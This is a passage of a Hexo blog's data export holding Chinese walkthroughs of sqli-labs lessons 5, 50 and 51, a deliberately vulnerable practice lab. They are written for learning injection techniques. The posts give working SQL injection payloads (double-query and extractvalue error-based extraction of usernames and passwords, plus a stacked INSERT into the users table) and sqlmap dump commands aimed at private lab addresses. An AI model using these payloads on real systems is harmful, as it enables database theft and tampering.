0,1' at line 1`\n\n尝试将右侧注释掉\n\n`http://10.60.250.181/sqlilabs/Less-5/?id=1%27%23`\n\n![3](https://i.imgur.com/u9vm04H.png)\n\n没有返回信息,但是显示的是“You are in”,猜测这次可能正确执行SQL语句就显示“You are in”,错误就报错。\n\n查看源码验证...\n\n![4](https://i.imgur.com/pz8TbRh.png)\n\n果然如此。\n\n有没有一种方法能在错误种把我要获取的信息显示出来呢？就是双注入了。\n\n\n### 双注入 ###\n\n过本关需要了解双注入。\n\n双注入需要count()、rand()、floor()这三个函数以及group by联合使用。\n\ncount():查询数量\n\nrand()：产生0~1间的随机数 \n\nfloor()：向下取整\n\ngroup by：按指定分类\n\n具体例子：\n\n`select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;`\n\n要让上述的报错实现数据库至少要3条数据。\n\n具体原因查看这篇分析\n\n[\nMysql报错注入原理分析(count()、rand()、group by)](http://wooyun.jozxing.cc/static/drops/tips-14312.html)\n\n### 字段数 ###\n\n![5](https://i.imgur.com/p0yH37f.png)\n\n![6](https://i.imgur.com/iWvqxd6.png)\n\n### 双注入报错 ###\n\n接下来的语句想要尝试多次。\n\n`http://10.60.250.181/sqlilabs/Less-5/?id=1' union select 1,count(*),concat((floor(rand(0)*2)),'--',(select database()))x from information_schema.tables group by x%23`\n\n![7](https://i.imgur.com/VdHTjv2.png)\n\n`http://10.60.250.181/sqlilabs/Less-5/?id=1' union select 1,count(*),concat((floor(rand(0)*2)),'--',(select table_name from information_schema.tables where table_schema = 'security' limit 0,1))x from information_schema.tables group by x%23`\n\n![8](https://i.imgur.com/vHIUWBM.png)\n\n蓝色标注部分修改成要查询的就行。\n\n`http://10.60.250.181/sqlilabs/Less-5/?id=1' union select 1,count(*),concat((floor(rand(0)*2)),'--',(select column_name from information_schema.columns where table_name = 'users' limit 0,1))x from information_schema.tables group by x%23`\n\n![9](https://i.imgur.com/SueF3no.png)\n\n`http://10.60.250.181/sqlilabs/Less-5/?id=1' union select 1,count(*),concat((floor(rand(0)*2)),'--',(select concat(id,'-',username,'-',password) from security.users limit 0,1))x from information_schema.tables group by x%23`\n\n![10](https://i.imgur.com/QftJYlR.png)\n\n## SQLMAP ##\n\n![11](https://i.imgur.com/PU5HoC2.png)\n\n![12](https://i.imgur.com/DJpLKuu.png)\n\n![13](https://i.imgur.com/6HBzjsu.png)","source":"_posts/sqli-labs-lession-5-GET单引号双注入.md","raw":"---\ntitle: sqli-labs-lession-5 GET单引号双注入\ndate: 2018-09-21 17:09:45\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession 5 GET单引号双注入 #\n---\n\n## 登录界面 ##\n\n![1](https://i.imgur.com/o5P4i5s.png)\n\n\n## 手注 ##\n输入单引号测试下\n\n`http://10.60.250.181/sqlilabs/Less-5/?id=1%27`\n\n![2](https://i.imgur.com/C2OndYK.png)\n\n返回的错误信息和Lesson-1一样。\n\n`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1`\n\n尝试将右侧注释掉\n\n`http://10.60.250.181/sqlilabs/Less-5/?id=1%27%23`\n\n![3](https://i.imgur.com/u9vm04H.png)\n\n没有返回信息,但是显示的是“You are in”,猜测这次可能正确执行SQL语句就显示“You are in”,错误就报错。\n\n查看源码验证...\n\n![4](https://i.imgur.com/pz8TbRh.png)\n\n果然如此。\n\n有没有一种方法能在错误种把我要获取的信息显示出来呢？就是双注入了。\n\n\n### 双注入 ###\n\n过本关需要了解双注入。\n\n双注入需要count()、rand()、floor()这三个函数以及group by联合使用。\n\ncount():查询数量\n\nrand()：产生0~1间的随机数 \n\nfloor()：向下取整\n\ngroup by：按指定分类\n\n具体例子：\n\n`select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;`\n\n要让上述的报错实现数据库至少要3条数据。\n\n具体原因查看这篇分析\n\n[\nMysql报错注入原理分析(count()、rand()、group by)](http://wooyun.jozxing.cc/static/drops/tips-14312.html)\n\n### 字段数 ###\n\n![5](https://i.imgur.com/p0yH37f.png)\n\n![6](https://i.imgur.com/iWvqxd6.png)\n\n### 双注入报错 ###\n\n接下来的语句想要尝试多次。\n\n`http://10.60.250.181/sqlilabs/Less-5/?id=1' union select 1,count(*),concat((floor(rand(0)*2)),'--',(select database()))x from information_schema.tables group by x%23`\n\n![7](https://i.imgur.com/VdHTjv2.png)\n\n`http://10.60.250.181/sqlilabs/Less-5/?id=1' union select 1,count(*),concat((floor(rand(0)*2)),'--',(select table_name from information_schema.tables where table_schema = 'security' limit 0,1))x from information_schema.tables group by x%23`\n\n![8](https://i.imgur.com/vHIUWBM.png)\n\n蓝色标注部分修改成要查询的就行。\n\n`http://10.60.250.181/sqlilabs/Less-5/?id=1' union select 1,count(*),concat((floor(rand(0)*2)),'--',(select column_name from information_schema.columns where table_name = 'users' limit 0,1))x from information_schema.tables group by x%23`\n\n![9](https://i.imgur.com/SueF3no.png)\n\n`http://10.60.250.181/sqlilabs/Less-5/?id=1' union select 1,count(*),concat((floor(rand(0)*2)),'--',(select concat(id,'-',username,'-',password) from security.users limit 0,1))x from information_schema.tables group by x%23`\n\n![10](https://i.imgur.com/QftJYlR.png)\n\n## SQLMAP ##\n\n![11](https://i.imgur.com/PU5HoC2.png)\n\n![12](https://i.imgur.com/DJpLKuu.png)\n\n![13](https://i.imgur.com/6HBzjsu.png)","slug":"sqli-labs-lession-5-GET单引号双注入","published":1,"updated":"2019-06-19T17:23:13.395Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istf700634dsbqnnjzoys","content":"<h1 id=\"sqli-labs-lession-5-GET单引号双注入\"><a href=\"#sqli-labs-lession-5-GET单引号双注入\" class=\"headerlink\" title=\"sqli-labs lession 5 GET单引号双注入\"></a>sqli-labs lession 5 GET单引号双注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"https://i.imgur.com/o5P4i5s.png\" alt=\"1\"></p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><p>输入单引号测试下</p>\n<p><code>http://10.60.250.181/sqlilabs/Less-5/?id=1%27</code></p>\n<p><img src=\"https://i.imgur.com/C2OndYK.png\" alt=\"2\"></p>\n<p>返回的错误信息和Lesson-1一样。</p>\n<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code></p>\n<p>尝试将右侧注释掉</p>\n<p><code>http://10.60.250.181/sqlilabs/Less-5/?id=1%27%23</code></p>\n<p><img src=\"https://i.imgur.com/u9vm04H.png\" alt=\"3\"></p>\n<p>没有返回信息,但是显示的是“You are in”,猜测这次可能正确执行SQL语句就显示“You are in”,错误就报错。</p>\n<p>查看源码验证…</p>\n<p><img src=\"https://i.imgur.com/pz8TbRh.png\" alt=\"4\"></p>\n<p>果然如此。</p>\n<p>有没有一种方法能在错误种把我要获取的信息显示出来呢？就是双注入了。</p>\n<h3 id=\"双注入\"><a href=\"#双注入\" class=\"headerlink\" title=\"双注入\"></a>双注入</h3><p>过本关需要了解双注入。</p>\n<p>双注入需要count()、rand()、floor()这三个函数以及group by联合使用。</p>\n<p>count():查询数量</p>\n<p>rand()：产生0~1间的随机数 </p>\n<p>floor()：向下取整</p>\n<p>group by：按指定分类</p>\n<p>具体例子：</p>\n<p><code>select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;</code></p>\n<p>要让上述的报错实现数据库至少要3条数据。</p>\n<p>具体原因查看这篇分析</p>\n<p><a href=\"http://wooyun.jozxing.cc/static/drops/tips-14312.html\" target=\"_blank\" rel=\"noopener\"><br>Mysql报错注入原理分析(count()、rand()、group by)</a></p>\n<h3 id=\"字段数\"><a href=\"#字段数\" class=\"headerlink\" title=\"字段数\"></a>字段数</h3><p><img src=\"https://i.imgur.com/p0yH37f.png\" alt=\"5\"></p>\n<p><img src=\"https://i.imgur.com/iWvqxd6.png\" alt=\"6\"></p>\n<h3 id=\"双注入报错\"><a href=\"#双注入报错\" class=\"headerlink\" title=\"双注入报错\"></a>双注入报错</h3><p>接下来的语句想要尝试多次。</p>\n<p><code>http://10.60.250.181/sqlilabs/Less-5/?id=1&#39; union select 1,count(*),concat((floor(rand(0)*2)),&#39;--&#39;,(select database()))x from information_schema.tables group by x%23</code></p>\n<p><img src=\"https://i.imgur.com/VdHTjv2.png\" alt=\"7\"></p>\n<p><code>http://10.60.250.181/sqlilabs/Less-5/?id=1&#39; union select 1,count(*),concat((floor(rand(0)*2)),&#39;--&#39;,(select table_name from information_schema.tables where table_schema = &#39;security&#39; limit 0,1))x from information_schema.tables group by x%23</code></p>\n<p><img src=\"https://i.imgur.com/vHIUWBM.png\" alt=\"8\"></p>\n<p>蓝色标注部分修改成要查询的就行。</p>\n<p><code>http://10.60.250.181/sqlilabs/Less-5/?id=1&#39; union select 1,count(*),concat((floor(rand(0)*2)),&#39;--&#39;,(select column_name from information_schema.columns where table_name = &#39;users&#39; limit 0,1))x from information_schema.tables group by x%23</code></p>\n<p><img src=\"https://i.imgur.com/SueF3no.png\" alt=\"9\"></p>\n<p><code>http://10.60.250.181/sqlilabs/Less-5/?id=1&#39; union select 1,count(*),concat((floor(rand(0)*2)),&#39;--&#39;,(select concat(id,&#39;-&#39;,username,&#39;-&#39;,password) from security.users limit 0,1))x from information_schema.tables group by x%23</code></p>\n<p><img src=\"https://i.imgur.com/QftJYlR.png\" alt=\"10\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><img src=\"https://i.imgur.com/PU5HoC2.png\" alt=\"11\"></p>\n<p><img src=\"https://i.imgur.com/DJpLKuu.png\" alt=\"12\"></p>\n<p><img src=\"https://i.imgur.com/6HBzjsu.png\" alt=\"13\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-5-GET单引号双注入\"><a href=\"#sqli-labs-lession-5-GET单引号双注入\" class=\"headerlink\" title=\"sqli-labs lession 5 GET单引号双注入\"></a>sqli-labs lession 5 GET单引号双注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"https://i.imgur.com/o5P4i5s.png\" alt=\"1\"></p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><p>输入单引号测试下</p>\n<p><code>http://10.60.250.181/sqlilabs/Less-5/?id=1%27</code></p>\n<p><img src=\"https://i.imgur.com/C2OndYK.png\" alt=\"2\"></p>\n<p>返回的错误信息和Lesson-1一样。</p>\n<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code></p>\n<p>尝试将右侧注释掉</p>\n<p><code>http://10.60.250.181/sqlilabs/Less-5/?id=1%27%23</code></p>\n<p><img src=\"https://i.imgur.com/u9vm04H.png\" alt=\"3\"></p>\n<p>没有返回信息,但是显示的是“You are in”,猜测这次可能正确执行SQL语句就显示“You are in”,错误就报错。</p>\n<p>查看源码验证…</p>\n<p><img src=\"https://i.imgur.com/pz8TbRh.png\" alt=\"4\"></p>\n<p>果然如此。</p>\n<p>有没有一种方法能在错误种把我要获取的信息显示出来呢？就是双注入了。</p>\n<h3 id=\"双注入\"><a href=\"#双注入\" class=\"headerlink\" title=\"双注入\"></a>双注入</h3><p>过本关需要了解双注入。</p>\n<p>双注入需要count()、rand()、floor()这三个函数以及group by联合使用。</p>\n<p>count():查询数量</p>\n<p>rand()：产生0~1间的随机数 </p>\n<p>floor()：向下取整</p>\n<p>group by：按指定分类</p>\n<p>具体例子：</p>\n<p><code>select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;</code></p>\n<p>要让上述的报错实现数据库至少要3条数据。</p>\n<p>具体原因查看这篇分析</p>\n<p><a href=\"http://wooyun.jozxing.cc/static/drops/tips-14312.html\" target=\"_blank\" rel=\"noopener\"><br>Mysql报错注入原理分析(count()、rand()、group by)</a></p>\n<h3 id=\"字段数\"><a href=\"#字段数\" class=\"headerlink\" title=\"字段数\"></a>字段数</h3><p><img src=\"https://i.imgur.com/p0yH37f.png\" alt=\"5\"></p>\n<p><img src=\"https://i.imgur.com/iWvqxd6.png\" alt=\"6\"></p>\n<h3 id=\"双注入报错\"><a href=\"#双注入报错\" class=\"headerlink\" title=\"双注入报错\"></a>双注入报错</h3><p>接下来的语句想要尝试多次。</p>\n<p><code>http://10.60.250.181/sqlilabs/Less-5/?id=1&#39; union select 1,count(*),concat((floor(rand(0)*2)),&#39;--&#39;,(select database()))x from information_schema.tables group by x%23</code></p>\n<p><img src=\"https://i.imgur.com/VdHTjv2.png\" alt=\"7\"></p>\n<p><code>http://10.60.250.181/sqlilabs/Less-5/?id=1&#39; union select 1,count(*),concat((floor(rand(0)*2)),&#39;--&#39;,(select table_name from information_schema.tables where table_schema = &#39;security&#39; limit 0,1))x from information_schema.tables group by x%23</code></p>\n<p><img src=\"https://i.imgur.com/vHIUWBM.png\" alt=\"8\"></p>\n<p>蓝色标注部分修改成要查询的就行。</p>\n<p><code>http://10.60.250.181/sqlilabs/Less-5/?id=1&#39; union select 1,count(*),concat((floor(rand(0)*2)),&#39;--&#39;,(select column_name from information_schema.columns where table_name = &#39;users&#39; limit 0,1))x from information_schema.tables group by x%23</code></p>\n<p><img src=\"https://i.imgur.com/SueF3no.png\" alt=\"9\"></p>\n<p><code>http://10.60.250.181/sqlilabs/Less-5/?id=1&#39; union select 1,count(*),concat((floor(rand(0)*2)),&#39;--&#39;,(select concat(id,&#39;-&#39;,username,&#39;-&#39;,password) from security.users limit 0,1))x from information_schema.tables group by x%23</code></p>\n<p><img src=\"https://i.imgur.com/QftJYlR.png\" alt=\"10\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><img src=\"https://i.imgur.com/PU5HoC2.png\" alt=\"11\"></p>\n<p><img src=\"https://i.imgur.com/DJpLKuu.png\" alt=\"12\"></p>\n<p><img src=\"https://i.imgur.com/6HBzjsu.png\" alt=\"13\"></p>\n"},{"title":"sqli-labs lession-50-GET 基于错误-数字型堆叠注入-OrderBy注入","date":"2018-11-09T01:06:13.000Z","_content":"\n# sqli-labs lession-50-GET 基于错误-数字型堆叠注入-OrderBy注入\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-50/001.png)\n\n## 注入\n\n### 判断注入类型\n\n![002](/img/sql/Lesson-50/002.png)\n\n判断为数字型\n\n### 获取数据库名\n\n`http://10.60.17.35:8082/Less-50/?sort=1 and extractvalue(null,concat(0x7e,database(),0x7e))%23`\n\n![003](/img/sql/Lesson-50/003.png)\n\n### 获取表名\n\n`http://10.60.17.35:8082/Less-50/?sort=1 and extractvalue(null,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema='security'),0x7e))%23`\n\n![004](/img/sql/Lesson-50/004.png)\n\n### 获取列名\n\n`http://10.60.17.35:8082/Less-50/?sort=1 and extractvalue(null,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema='security' and table_name='users'),0x7e))%23`\n\n![005](/img/sql/Lesson-50/005.png)\n\n### 获取字段\n\n`http://10.60.17.35:8082/Less-50/?sort=1 and extractvalue(null,concat(0x7e,(select concat(0x7e,username,0x7e,password)from security.users limit 0,1),0x7e))%23`\n\n![006](/img/sql/Lesson-50/006.png)\n\n## 堆叠注入\n\n`http://10.60.17.35:8082/Less-50/?sort=1;insert into users(id,username,password)values(100,'huai','dan');%23`\n\n![007](/img/sql/Lesson-50/007.png)\n\n## SQLMAP\n\n`sqlmap -u \"http://10.60.17.35:8082/Less-50/?sort=1\" --dbms mysql --technique E`\n\n![008](/img/sql/Lesson-50/008.png)\n\n![009](/img/sql/Lesson-50/009.png)\n\n`sqlmap -u \"http://10.60.17.35:8082/Less-50/?sort=1\" --dbms mysql --technique E -D security -T users --columns --dump`\n\n![010](/img/sql/Lesson-50/010.png)\n\n![011](/img/sql/Lesson-50/011.png)\n\n","source":"_posts/sqli-labs-lession-50-GET-基于错误-数字型堆叠注入-OrderBy注入.md","raw":"---\ntitle: sqli-labs lession-50-GET 基于错误-数字型堆叠注入-OrderBy注入\ndate: 2018-11-09 09:06:13\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-50-GET 基于错误-数字型堆叠注入-OrderBy注入\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-50/001.png)\n\n## 注入\n\n### 判断注入类型\n\n![002](/img/sql/Lesson-50/002.png)\n\n判断为数字型\n\n### 获取数据库名\n\n`http://10.60.17.35:8082/Less-50/?sort=1 and extractvalue(null,concat(0x7e,database(),0x7e))%23`\n\n![003](/img/sql/Lesson-50/003.png)\n\n### 获取表名\n\n`http://10.60.17.35:8082/Less-50/?sort=1 and extractvalue(null,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema='security'),0x7e))%23`\n\n![004](/img/sql/Lesson-50/004.png)\n\n### 获取列名\n\n`http://10.60.17.35:8082/Less-50/?sort=1 and extractvalue(null,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema='security' and table_name='users'),0x7e))%23`\n\n![005](/img/sql/Lesson-50/005.png)\n\n### 获取字段\n\n`http://10.60.17.35:8082/Less-50/?sort=1 and extractvalue(null,concat(0x7e,(select concat(0x7e,username,0x7e,password)from security.users limit 0,1),0x7e))%23`\n\n![006](/img/sql/Lesson-50/006.png)\n\n## 堆叠注入\n\n`http://10.60.17.35:8082/Less-50/?sort=1;insert into users(id,username,password)values(100,'huai','dan');%23`\n\n![007](/img/sql/Lesson-50/007.png)\n\n## SQLMAP\n\n`sqlmap -u \"http://10.60.17.35:8082/Less-50/?sort=1\" --dbms mysql --technique E`\n\n![008](/img/sql/Lesson-50/008.png)\n\n![009](/img/sql/Lesson-50/009.png)\n\n`sqlmap -u \"http://10.60.17.35:8082/Less-50/?sort=1\" --dbms mysql --technique E -D security -T users --columns --dump`\n\n![010](/img/sql/Lesson-50/010.png)\n\n![011](/img/sql/Lesson-50/011.png)\n\n","slug":"sqli-labs-lession-50-GET-基于错误-数字型堆叠注入-OrderBy注入","published":1,"updated":"2019-06-19T17:23:13.395Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istf800674dsbtguf3mwg","content":"<h1 id=\"sqli-labs-lession-50-GET-基于错误-数字型堆叠注入-OrderBy注入\"><a href=\"#sqli-labs-lession-50-GET-基于错误-数字型堆叠注入-OrderBy注入\" class=\"headerlink\" title=\"sqli-labs lession-50-GET 基于错误-数字型堆叠注入-OrderBy注入\"></a>sqli-labs lession-50-GET 基于错误-数字型堆叠注入-OrderBy注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-50/001.png\" alt=\"001\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><h3 id=\"判断注入类型\"><a href=\"#判断注入类型\" class=\"headerlink\" title=\"判断注入类型\"></a>判断注入类型</h3><p><img src=\"/img/sql/Lesson-50/002.png\" alt=\"002\"></p>\n<p>判断为数字型</p>\n<h3 id=\"获取数据库名\"><a href=\"#获取数据库名\" class=\"headerlink\" title=\"获取数据库名\"></a>获取数据库名</h3><p><code>http://10.60.17.35:8082/Less-50/?sort=1 and extractvalue(null,concat(0x7e,database(),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-50/003.png\" alt=\"003\"></p>\n<h3 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h3><p><code>http://10.60.17.35:8082/Less-50/?sort=1 and extractvalue(null,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39;),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-50/004.png\" alt=\"004\"></p>\n<h3 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h3><p><code>http://10.60.17.35:8082/Less-50/?sort=1 and extractvalue(null,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-50/005.png\" alt=\"005\"></p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p><code>http://10.60.17.35:8082/Less-50/?sort=1 and extractvalue(null,concat(0x7e,(select concat(0x7e,username,0x7e,password)from security.users limit 0,1),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-50/006.png\" alt=\"006\"></p>\n<h2 id=\"堆叠注入\"><a href=\"#堆叠注入\" class=\"headerlink\" title=\"堆叠注入\"></a>堆叠注入</h2><p><code>http://10.60.17.35:8082/Less-50/?sort=1;insert into users(id,username,password)values(100,&#39;huai&#39;,&#39;dan&#39;);%23</code></p>\n<p><img src=\"/img/sql/Lesson-50/007.png\" alt=\"007\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><code>sqlmap -u &quot;http://10.60.17.35:8082/Less-50/?sort=1&quot; --dbms mysql --technique E</code></p>\n<p><img src=\"/img/sql/Lesson-50/008.png\" alt=\"008\"></p>\n<p><img src=\"/img/sql/Lesson-50/009.png\" alt=\"009\"></p>\n<p><code>sqlmap -u &quot;http://10.60.17.35:8082/Less-50/?sort=1&quot; --dbms mysql --technique E -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-50/010.png\" alt=\"010\"></p>\n<p><img src=\"/img/sql/Lesson-50/011.png\" alt=\"011\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-50-GET-基于错误-数字型堆叠注入-OrderBy注入\"><a href=\"#sqli-labs-lession-50-GET-基于错误-数字型堆叠注入-OrderBy注入\" class=\"headerlink\" title=\"sqli-labs lession-50-GET 基于错误-数字型堆叠注入-OrderBy注入\"></a>sqli-labs lession-50-GET 基于错误-数字型堆叠注入-OrderBy注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-50/001.png\" alt=\"001\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><h3 id=\"判断注入类型\"><a href=\"#判断注入类型\" class=\"headerlink\" title=\"判断注入类型\"></a>判断注入类型</h3><p><img src=\"/img/sql/Lesson-50/002.png\" alt=\"002\"></p>\n<p>判断为数字型</p>\n<h3 id=\"获取数据库名\"><a href=\"#获取数据库名\" class=\"headerlink\" title=\"获取数据库名\"></a>获取数据库名</h3><p><code>http://10.60.17.35:8082/Less-50/?sort=1 and extractvalue(null,concat(0x7e,database(),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-50/003.png\" alt=\"003\"></p>\n<h3 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h3><p><code>http://10.60.17.35:8082/Less-50/?sort=1 and extractvalue(null,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39;),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-50/004.png\" alt=\"004\"></p>\n<h3 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h3><p><code>http://10.60.17.35:8082/Less-50/?sort=1 and extractvalue(null,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-50/005.png\" alt=\"005\"></p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p><code>http://10.60.17.35:8082/Less-50/?sort=1 and extractvalue(null,concat(0x7e,(select concat(0x7e,username,0x7e,password)from security.users limit 0,1),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-50/006.png\" alt=\"006\"></p>\n<h2 id=\"堆叠注入\"><a href=\"#堆叠注入\" class=\"headerlink\" title=\"堆叠注入\"></a>堆叠注入</h2><p><code>http://10.60.17.35:8082/Less-50/?sort=1;insert into users(id,username,password)values(100,&#39;huai&#39;,&#39;dan&#39;);%23</code></p>\n<p><img src=\"/img/sql/Lesson-50/007.png\" alt=\"007\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><code>sqlmap -u &quot;http://10.60.17.35:8082/Less-50/?sort=1&quot; --dbms mysql --technique E</code></p>\n<p><img src=\"/img/sql/Lesson-50/008.png\" alt=\"008\"></p>\n<p><img src=\"/img/sql/Lesson-50/009.png\" alt=\"009\"></p>\n<p><code>sqlmap -u &quot;http://10.60.17.35:8082/Less-50/?sort=1&quot; --dbms mysql --technique E -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-50/010.png\" alt=\"010\"></p>\n<p><img src=\"/img/sql/Lesson-50/011.png\" alt=\"011\"></p>\n"},{"title":"sqli-labs lession-51-GET 基于错误-字符型堆叠注入-OrderBy注入","date":"2018-11-19T01:04:44.000Z","_content":"\n# sqli-labs lession-51-GET 基于错误-字符型堆叠注入-OrderBy注入\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-51/001.png)\n\n## 注入\n\n### 判断类型\n\n输入单引号报错\n\n![002](/img/sql/Lesson-51/002.png)\n\n通过报错可以判断单引号闭合。\n\n### 获取数据库\n\n`http://10.60.17.35:8082/Less-51/?sort=1'+and+extractvalue(null,concat(0x7e,database(),0x7e))%23`\n\n![003](/img/sql/Lesson-51/003.png)\n\n### 获取字段\n\n中间过程和上一课一样,直接省略\n\n{% post_link sqli-labs-lession-50-GET-基于错误-数字型堆叠注入-OrderBy注入  点击查看Lesson-50%}\n\n`http://10.60.17.35:8082/Less-51/?sort=1'+and+extractvalue(null,concat(0x7e,(select concat(0x7e,username,0x7e,password)from security.users limit 0,1),0x7e))%23`\n\n![004](/img/sql/Lesson-51/004.png)\n\n## 堆叠注入\n\n`http://10.60.17.35:8082/Less-51/?sort=1';insert into users(id,username,password)values(101,'huai1','dan2')%23`\n\n![005](/img/sql/Lesson-51/005.png)\n\n## SQLMAP\n\n`sqlmap -u http://10.60.17.35:8082/Less-51/?sort=1 --technique E --dbms mysql `\n\n![006](/img/sql/Lesson-51/006.png)\n\n![007](/img/sql/Lesson-51/007.png)\n\n`sqlmap -u http://10.60.17.35:8082/Less-51/?sort=1 --technique E --dbms mysql -D security -T users -C username,password --dump --threads 20`\n\n![008](/img/sql/Lesson-51/008.png)\n\n![009](/img/sql/Lesson-51/009.png)\n\n","source":"_posts/sqli-labs-lession-51-GET-基于错误-字符型堆叠注入-OrderBy注入.md","raw":"---\ntitle: sqli-labs lession-51-GET 基于错误-字符型堆叠注入-OrderBy注入\ndate: 2018-11-19 09:04:44\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-51-GET 基于错误-字符型堆叠注入-OrderBy注入\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-51/001.png)\n\n## 注入\n\n### 判断类型\n\n输入单引号报错\n\n![002](/img/sql/Lesson-51/002.png)\n\n通过报错可以判断单引号闭合。\n\n### 获取数据库\n\n`http://10.60.17.35:8082/Less-51/?sort=1'+and+extractvalue(null,concat(0x7e,database(),0x7e))%23`\n\n![003](/img/sql/Lesson-51/003.png)\n\n### 获取字段\n\n中间过程和上一课一样,直接省略\n\n{% post_link sqli-labs-lession-50-GET-基于错误-数字型堆叠注入-OrderBy注入  点击查看Lesson-50%}\n\n`http://10.60.17.35:8082/Less-51/?sort=1'+and+extractvalue(null,concat(0x7e,(select concat(0x7e,username,0x7e,password)from security.users limit 0,1),0x7e))%23`\n\n![004](/img/sql/Lesson-51/004.png)\n\n## 堆叠注入\n\n`http://10.60.17.35:8082/Less-51/?sort=1';insert into users(id,username,password)values(101,'huai1','dan2')%23`\n\n![005](/img/sql/Lesson-51/005.png)\n\n## SQLMAP\n\n`sqlmap -u http://10.60.17.35:8082/Less-51/?sort=1 --technique E --dbms mysql `\n\n![006](/img/sql/Lesson-51/006.png)\n\n![007](/img/sql/Lesson-51/007.png)\n\n`sqlmap -u http://10.60.17.35:8082/Less-51/?sort=1 --technique E --dbms mysql -D security -T users -C username,password --dump --threads 20`\n\n![008](/img/sql/Lesson-51/008.png)\n\n![009](/img/sql/Lesson-51/009.png)\n\n","slug":"sqli-labs-lession-51-GET-基于错误-字符型堆叠注入-OrderBy注入","published":1,"updated":"2019-06-19T17:23:13.396Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istf9006a4dsbmr4icedw","content":"<h1 id=\"sqli-labs-lession-51-GET-基于错误-字符型堆叠注入-OrderBy注入\"><a href=\"#sqli-labs-lession-51-GET-基于错误-字符型堆叠注入-OrderBy注入\" class=\"headerlink\" title=\"sqli-labs lession-51-GET 基于错误-字符型堆叠注入-OrderBy注入\"></a>sqli-labs lession-51-GET 基于错误-字符型堆叠注入-OrderBy注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-51/001.png\" alt=\"001\"></p>\n<h2 